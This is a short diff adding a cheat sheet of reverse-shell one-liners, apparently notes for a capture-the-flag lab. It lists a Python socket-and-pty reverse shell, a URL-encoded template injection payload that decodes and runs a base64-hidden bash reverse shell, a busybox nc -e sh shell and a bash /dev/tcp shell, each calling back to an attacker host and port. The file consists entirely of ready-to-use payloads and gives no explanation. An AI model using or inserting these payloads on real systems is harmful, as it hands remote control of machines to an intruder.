@@ -1,0 +1,13 @@
+Python scripts:
+
+1. (New Shell) python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.158",1338));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
+
+2. a///A77ss/e%0A;<%25%3d+system("echo IyEvYmluL2Jhc2gKYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDIvMTMz
+NyAwPiYxIgo= | base64 -d | bash")+%25>+
+
+
+Bash Scripts:
+
+1. busybox nc 10.10.14.13 1337 -e sh
+
+2. bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
